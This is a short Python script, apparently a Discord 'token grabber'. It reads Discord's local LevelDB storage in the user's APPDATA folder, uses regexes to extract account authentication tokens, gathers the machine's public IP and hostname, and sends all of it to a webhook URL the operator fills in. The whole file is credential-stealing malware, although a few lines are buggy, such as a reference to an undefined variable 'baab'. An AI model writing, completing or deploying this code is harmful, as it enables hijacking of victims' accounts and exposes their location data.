import os
import socket
from dhooks import Webhook, File, Embed
import requests
import re

r = requests.session()
ds = ('ENTER YOUR WEBHOOK URL')

app=os.getenv('APPDATA')
tokendir = app + '\\Discord\\Local Storage\\leveldb\\'
dird = os.listdir(tokendir)

ip = r.get('https://api.ipify.org').text

name = socket.gethostname()

hook = Webhook(ds)
for file in dird:
    y = (str(tokendir)+str(file))
    

def find_tokens(path):
    
    path = tokendir
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

bb = str(find_tokens(tokendir))
bb2 = bb.replace('[\'','')
bb3 = bb2.replace('\']','')

hook.send(f'''
```yaml

--------------------------GRABBED_INFO-----------------------------
IP : {ip}
Hostname : {name}
Token : {bb3}
---------------------------SYSTEM_INFO-----------------------------
{baab}
-------------------------------------------------------------------
```
'''
)

if FileNotFoundError:
    exit()


